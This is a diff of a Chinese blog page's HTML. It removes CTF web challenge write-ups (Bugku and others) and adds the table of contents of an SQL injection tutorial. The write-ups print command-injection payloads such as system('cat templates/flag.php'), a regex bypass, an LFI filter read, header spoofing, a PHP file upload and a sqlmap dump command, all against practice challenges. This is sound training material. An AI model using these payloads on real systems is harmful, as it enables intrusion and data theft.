src="https://img-blog.csdnimg.cn/20210303092737836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是构造payload：page= ‘.system(“cat templates/flag.php”).’</p>
-<p>23.favorite_number<br><img src="https://img-blog.csdnimg.cn/2021030309523031.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目进行一次数组比较和两次正则绕过<br>构造payload：stuff[4294967296]=admin&amp;stuff[1]=user来满足stuff[0]！=’admin’<br>再构造payload： num=12345%0a ls<br>最后用字符拼接 a=f;b=ag;c=l;tac /$a$c$b</p>
-<p>24.lottery<br><img src="https://img-blog.csdnimg.cn/20210303101416508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个买彩票的网站，但是要买flag钱不够<br><img src="https://img-blog.csdnimg.cn/20210303101625453.png" alt="在这里插入图片描述"><br>在robots.txt发现存在.git目录，下载源码，最后在 api.php 里面发现漏洞<br><img src="https://img-blog.csdnimg.cn/20210303102101108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将POST数据改成 {“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]} 多发送<br>几次购买flag</p>
-<p>28.bug<br><img src="https://img-blog.csdnimg.cn/20210303104742587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注册登录点manage需要admin用户，点击忘记密码进行修改抓包修改用户名为 admin登陆 admin 账号，点击 manager，提示 ip 问题构造 xff=127.0.0.1，获得/index.php?module=filemanager&amp;do=???感觉应该是文件上传，构造一个 jpg 文件，抓包改格式为.php5</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/04/Bugku%20web%E5%8C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yun421">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yun421">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/04/Bugku%20web%E5%8C%BA/" class="post-title-link" itemprop="url">Bugku</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-04 14:40:16" itemprop="dateCreated datePublished" datetime="2021-03-04T14:40:16+08:00">2021-03-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-15 17:13:11" itemprop="dateModified" datetime="2021-10-15T17:13:11+08:00">2021-10-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>web1.<img src="https://img-blog.csdnimg.cn/20210304135636453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>F12查看源代码直接搞定</p>
-<p>web2.<img src="https://img-blog.csdnimg.cn/20210304135848918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只能输入一位，F12修改长度<br><img src="https://img-blog.csdnimg.cn/20210304135938171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>web3.<br>$_GET，只要我们传递的参数为what，并且内容为flag，即可输出flag<br><img src="https://img-blog.csdnimg.cn/20210304140104456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>web4.<br><img src="https://img-blog.csdnimg.cn/20210304140134966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助插件hackerbar进行一个POST传参</p>
-<p>web5.<br><img src="https://img-blog.csdnimg.cn/20210304140238144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目要求num为1却不能是数字，这就很矛盾了，我们传一个以1开头，不能以数字结尾的字符串就行了</p>
-<p>web6.<br><img src="https://img-blog.csdnimg.cn/2021030414044188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210304140554441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>web7.<br>访问页面后它会无限刷新，我们挂一个Burp抓抓包就好了，会出现一个10.jpg的页面，这个页面的长度跟其他页面长度不同，flag就在里边<img src="https://img-blog.csdnimg.cn/20210304140733622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>web8.<br><img src="https://img-blog.csdnimg.cn/20210304140836267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始想到的是用eval执行一个file()函数，来进行文件包含，但是这里对用户的输入进行了正则过滤，所以考虑到用GLOBAS[]输出所有的全局变量<br><img src="https://img-blog.csdnimg.cn/2021030414093948.png" alt="在这里插入图片描述"></p>
-<p>web9.<br><img src="https://img-blog.csdnimg.cn/20210304141019314.png" alt="在这里插入图片描述"><br>F12网络查看header得到flag，或者burp抓包得到</p>
-<p>web10.<br>打开后是一个黑页，御剑扫描<br><img src="https://img-blog.csdnimg.cn/20210304141332305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问后发现需要密码，试了试一些常规的shell弱口令得到flag，密码为hack</p>
-<p>web11.<br><img src="https://img-blog.csdnimg.cn/20210304141620919.png" alt="在这里插入图片描述"><br>base64解密得到密码</p>
-<p><img src="https://img-blog.csdnimg.cn/20210304141512512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>burp抓包xff：127.0.0.1即可</p>
-<p>web12.<br>var p1=’%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’;<br>var p2=’%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’;<br>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));<br>拼接urldecode解码</p>
-<p>web13.<br>php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码，题目也说了flag在index里，如果我们直接包含index.php，程序是会把它执行的，并不会输出源码，但是我们如果利用LFI漏洞来读取index，是会读到一串加密的字符串的<br><img src="https://img-blog.csdnimg.cn/20210304142108680.png" alt="在这里插入图片描述"><br>base64解码后得到flag</p>
-<p>web14.<br><img src="https://img-blog.csdnimg.cn/20210304142306817.png" alt="在这里插入图片描述"><br>看题目地址，提示爆破，且密码长度为5位数，一顿爆破结束</p>
-<p>web15.<br>拿出御剑来，专门扫一下.bak这种的备份文件吧<br><img src="https://img-blog.csdnimg.cn/20210304142428939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210304142523226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>你可能会发现这俩MD5是一样的，但我们传的值是不一样的，这是因为我们的key被过滤了，这里md5()相当于加密了个空气<img src="https://img-blog.csdnimg.cn/20210304142629583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不会了</p>
-<p>web16.<br>成绩单这一道题就是一个简单的POST注入，用burp抓个包，丢sqlmap里跑就行了<img src="https://img-blog.csdnimg.cn/20210304142802526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Sqlmap -r C:\Users\Administrator\Desktop\1.txt -p id –dump -C “skctf_flag” -T “fl4g” -D “skctf_flag”<br><img src="https://img-blog.csdnimg.cn/20210304142907716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -1146,6 +632,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">产生原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">SQL注入类型分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">SQL注入出现的位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">SQL注入利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="nav-number">5.</span> <span class="nav-text">SQL注入漏洞利用方式分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">Union联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%89%A7%E8%A1%8C%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">5.1.1.</span> <span class="nav-text">1.执行联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E3%80%81%E7%89%88%E6%9C%AC%E5%8F%B7%E3%80%81%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">5.1.2.</span> <span class="nav-text">2.查询数据库名、版本号、用户信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="nav-number">5.1.3.</span> <span class="nav-text">3.查询数据表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">5.1.4.</span> <span class="nav-text">4.查询字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E6%9F%A5%E8%AF%A2%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="nav-number">5.1.5.</span> <span class="nav-text">5.查询具体数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Burpsuite%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">5.1.5.1.</span> <span class="nav-text">Burpsuite字符型联合注入利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">5.1.6.</span> <span class="nav-text">过滤联合注入绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-number">5.1.6.1.</span> <span class="nav-text">PHP中常用的过滤函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">5.1.6.2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">5.1.6.3.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="nav-number">5.1.6.4.</span> <span class="nav-text">过滤单引号绕过 十六进制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">5.1.6.5.</span> <span class="nav-text">宽字节注入原理与利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.2.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">5.2.1.</span> <span class="nav-text">适用场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">5.2.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="nav-number">5.2.3.</span> <span class="nav-text">1.获取数据库名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="nav-number">5.2.4.</span> <span class="nav-text">2.获取数据表名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span class="nav-number">5.2.5.</span> <span class="nav-text">3.获取字段名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%8E%B7%E5%8F%96%E6%95%B0%E5%80%BC%E9%83%A8%E5%88%86"><span class="nav-number">5.2.6.</span> <span class="nav-text">4.获取数值部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap%E5%AF%B9%E6%B3%A8%E5%85%A5%E7%82%B9%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.7.</span> <span class="nav-text">sqlmap对注入点进行自动化布尔注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%EF%BC%88%E4%B8%8D%E6%AD%A2%E7%94%A8%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">5.2.8.</span> <span class="nav-text">布尔盲注过滤绕过技巧（不止用于布尔盲注）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">5.2.8.1.</span> <span class="nav-text">1.过滤逗号绕过技巧</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6%E6%8A%80%E5%B7%A7"><span class="nav-number">5.2.8.2.</span> <span class="nav-text">2.过滤比较运算符技巧</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8CTF%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"><span class="nav-number">5.2.9.</span> <span class="nav-text">布尔盲注CTF解题方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Python%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.9.1.</span> <span class="nav-text">Python编写代码自动化注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.3.</span> <span class="nav-text">延时盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8Python%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">5.3.1.</span> <span class="nav-text">延时盲注Python自动化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="nav-number">5.3.1.1.</span> <span class="nav-text">数据库名称</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="nav-number">5.3.1.2.</span> <span class="nav-text">数据表名称</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span class="nav-number">5.3.1.3.</span> <span class="nav-text">字段名称</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">5.3.1.4.</span> <span class="nav-text">字段值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">5.4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor-rand-0-2-%E6%8A%A5%E9%94%99"><span class="nav-number">5.4.1.</span> <span class="nav-text">floor(rand(0)*2)报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml%E6%8A%A5%E9%94%99"><span class="nav-number">5.4.2.</span> <span class="nav-text">updatexml报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue%E6%8A%A5%E9%94%99"><span class="nav-number">5.4.3.</span> <span class="nav-text">extractvalue报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C"><span class="nav-number">5.4.4.</span> <span class="nav-text">报错注入实验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%B3%A8%E5%85%A5"><span class="nav-number">5.5.</span> <span class="nav-text">约束注入</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
